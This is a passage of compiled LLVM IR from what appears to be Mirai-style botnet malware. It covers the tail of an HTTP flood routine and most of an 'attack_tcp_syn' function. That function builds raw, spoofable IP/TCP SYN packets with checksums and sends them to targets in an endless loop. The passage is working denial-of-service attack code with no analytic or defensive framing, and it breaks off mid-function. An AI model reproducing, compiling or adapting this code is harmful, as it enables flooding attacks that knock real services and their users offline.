  %852 = call i32 @close(i32 %851) #10
  store i32 -1, i32* %378, align 4
  store i8 0, i8* %414, align 4
  br label %.loopexit617

; <label>:853:                                    ; preds = %838
  %854 = load i32, i32* %416, align 4
  %855 = add nsw i32 %854, %847
  store i32 %855, i32* %416, align 4
  store i32 %376, i32* %419, align 4
  br label %856

; <label>:856:                                    ; preds = %952, %853
  %857 = phi i32 [ %959, %952 ], [ %855, %853 ]
  %858 = load i32, i32* %420, align 4
  %859 = icmp sgt i32 %858, 0
  br i1 %859, label %860, label %920

; <label>:860:                                    ; preds = %856
  %861 = icmp sgt i32 %858, %857
  %.sink14 = select i1 %861, i32* %416, i32* %420
  %862 = load i32, i32* %.sink14, align 4
  %863 = sub nsw i32 %858, %862
  store i32 %863, i32* %420, align 4
  %864 = load i32, i32* %421, align 4
  %865 = icmp eq i32 %864, 1
  br i1 %865, label %866, label %920

; <label>:866:                                    ; preds = %860
  %867 = call i8* @table_retrieve_val(i32 61, i32* null)
  %868 = call i32 @util_memsearch(i8* nonnull %417, i32 %857, i8* %867, i32 11)
  %869 = icmp eq i32 %868, -1
  br i1 %869, label %thread-pre-split593, label %870

; <label>:870:                                    ; preds = %866
  %871 = load i32, i32* %416, align 4
  %872 = call i8* @table_retrieve_val(i32 61, i32* null)
  %873 = call i32 @util_memsearch(i8* nonnull %417, i32 %871, i8* %872, i32 11)
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %874
  %876 = load i32, i32* %416, align 4
  %877 = sub nsw i32 %876, %873
  %878 = call i32 @util_memsearch(i8* %875, i32 %877, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %879 = add i32 %873, -1
  %880 = add i32 %879, %878
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %881
  store i8 0, i8* %882, align 1
  %883 = load i32, i32* %423, align 4
  %884 = icmp slt i32 %883, 5
  br i1 %884, label %885, label %919

; <label>:885:                                    ; preds = %870
  %886 = call i32 @util_strlen(i8* %875)
  %887 = icmp slt i32 %886, 128
  br i1 %887, label %888, label %919

; <label>:888:                                    ; preds = %885
  %889 = sext i32 %883 to i64
  %890 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %889, i64 0
  %891 = call i32 @util_strcpy(i8* %890, i8* %875)
  %892 = load i32, i32* %423, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %893, i64 0
  %895 = call i32 @util_strlen(i8* %894)
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %893, i64 %896
  %898 = call i32 @util_strcpy(i8* %897, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %899 = add i32 %873, 3
  %900 = add i32 %899, %878
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %901
  %903 = load i32, i32* %416, align 4
  %904 = sub nsw i32 %903, %900
  %905 = call i32 @util_memsearch(i8* %902, i32 %904, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %906 = add i32 %900, -1
  %907 = add i32 %906, %905
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %908
  store i8 0, i8* %909, align 1
  %910 = load i32, i32* %423, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %911, i64 0
  %913 = call i32 @util_strlen(i8* %912)
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 16, i64 %911, i64 %914
  %916 = call i32 @util_strcpy(i8* %915, i8* %902)
  %917 = load i32, i32* %423, align 4
  %918 = add nsw i32 %917, 1
  store i32 %918, i32* %423, align 4
  br label %919

; <label>:919:                                    ; preds = %888, %885, %870
  store i32 -1, i32* %420, align 4
  store i8 10, i8* %414, align 4
  br label %.loopexit617

thread-pre-split593:                              ; preds = %866
  %.pr594 = load i32, i32* %420, align 4
  br label %920

; <label>:920:                                    ; preds = %thread-pre-split593, %860, %856
  %921 = phi i32 [ %.pr594, %thread-pre-split593 ], [ %863, %860 ], [ %858, %856 ]
  %.0542 = phi i32 [ %862, %thread-pre-split593 ], [ %862, %860 ], [ 0, %856 ]
  %922 = icmp eq i32 %921, 0
  br i1 %922, label %923, label %950

; <label>:923:                                    ; preds = %920
  %924 = load i32, i32* %422, align 4
  %925 = icmp eq i32 %924, 1
  %926 = load i32, i32* %416, align 4
  br i1 %925, label %927, label %945

; <label>:927:                                    ; preds = %923
  %928 = call i32 @util_memsearch(i8* nonnull %417, i32 %926, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %929 = icmp eq i32 %928, -1
  br i1 %929, label %950, label %930

; <label>:930:                                    ; preds = %927
  %931 = add nsw i32 %928, -2
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %932
  store i8 0, i8* %933, align 1
  %934 = call i32 @util_memsearch(i8* nonnull %417, i32 %928, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %935 = icmp eq i32 %934, -1
  br i1 %935, label %939, label %936

; <label>:936:                                    ; preds = %930
  %937 = sext i32 %934 to i64
  %938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %937
  store i8 0, i8* %938, align 1
  br label %939

; <label>:939:                                    ; preds = %930, %936
  %940 = call i32 @util_atoi(i8* nonnull %417, i32 16)
  %941 = icmp eq i32 %940, 0
  br i1 %941, label %942, label %943

; <label>:942:                                    ; preds = %939
  store i8 1, i8* %414, align 4
  br label %.loopexit617

; <label>:943:                                    ; preds = %939
  %944 = add nsw i32 %940, 2
  store i32 %944, i32* %420, align 4
  br label %950

; <label>:945:                                    ; preds = %923
  %946 = sub nsw i32 %926, %.0542
  store i32 %946, i32* %420, align 4
  %947 = icmp eq i32 %946, 0
  br i1 %947, label %948, label %950

; <label>:948:                                    ; preds = %945
  store i8 1, i8* %414, align 4
  br label %.loopexit617

.backedge:                                        ; preds = %950, %952
  %.pr = load i8, i8* %414, align 4
  %949 = icmp eq i8 %.pr, 7
  br i1 %949, label %834, label %.loopexit617.loopexit

; <label>:950:                                    ; preds = %927, %943, %945, %920
  %.1543 = phi i32 [ %928, %943 ], [ %.0542, %927 ], [ %.0542, %945 ], [ %.0542, %920 ]
  %951 = icmp eq i32 %.1543, 0
  br i1 %951, label %.backedge, label %952

; <label>:952:                                    ; preds = %950
  %953 = load i32, i32* %416, align 4
  %954 = sub nsw i32 %953, %.1543
  store i32 %954, i32* %416, align 4
  %955 = sext i32 %.1543 to i64
  %956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %955
  %957 = sext i32 %954 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %417, i8* %956, i64 %957, i32 1, i1 false)
  %958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv696, i32 18, i64 %957
  store i8 0, i8* %958, align 1
  %959 = load i32, i32* %416, align 4
  %960 = icmp eq i32 %959, 0
  br i1 %960, label %.backedge, label %856

.preheader618:                                    ; preds = %.preheader618.preheader, %.preheader618
  %961 = tail call i32* @__errno_location() #11
  store i32 0, i32* %961, align 4
  %962 = load i32, i32* %378, align 4
  %963 = call i64 @recv(i32 %962, i8* nonnull %21, i64 10240, i32 16384) #10
  %964 = trunc i64 %963 to i32
  switch i32 %964, label %.preheader618 [
    i32 0, label %.thread604
    i32 -1, label %965
  ]

.thread604:                                       ; preds = %.preheader618
  store i32 104, i32* %961, align 4
  br label %.thread598

; <label>:965:                                    ; preds = %.preheader618
  %.pr603 = load i32, i32* %961, align 4
  %966 = icmp eq i32 %.pr603, 11
  br i1 %966, label %969, label %.thread598

.thread598:                                       ; preds = %965, %.thread604
  %967 = load i32, i32* %378, align 4
  %968 = call i32 @close(i32 %967) #10
  store i32 -1, i32* %378, align 4
  store i8 0, i8* %414, align 4
  br label %.loopexit617

; <label>:969:                                    ; preds = %965
  %.pr597 = load i8, i8* %414, align 4
  %970 = icmp eq i8 %.pr597, 0
  br i1 %970, label %.loopexit617, label %971

; <label>:971:                                    ; preds = %969
  store i8 1, i8* %414, align 4
  br label %.loopexit617

.loopexit617.loopexit:                            ; preds = %.backedge
  br label %.loopexit617

.loopexit617:                                     ; preds = %.loopexit617.loopexit, %948, %942, %919, %.thread598, %413, %848, %969, %402, %850, %971, %830, %432, %.lr.ph664, %817, %677, %429, %398
  %indvars.iv.next697 = add nuw nsw i64 %indvars.iv696, 1
  %972 = icmp slt i64 %indvars.iv.next697, %46
  br i1 %972, label %.lr.ph664, label %.backedge622.loopexit

; <label>:973:                                    ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
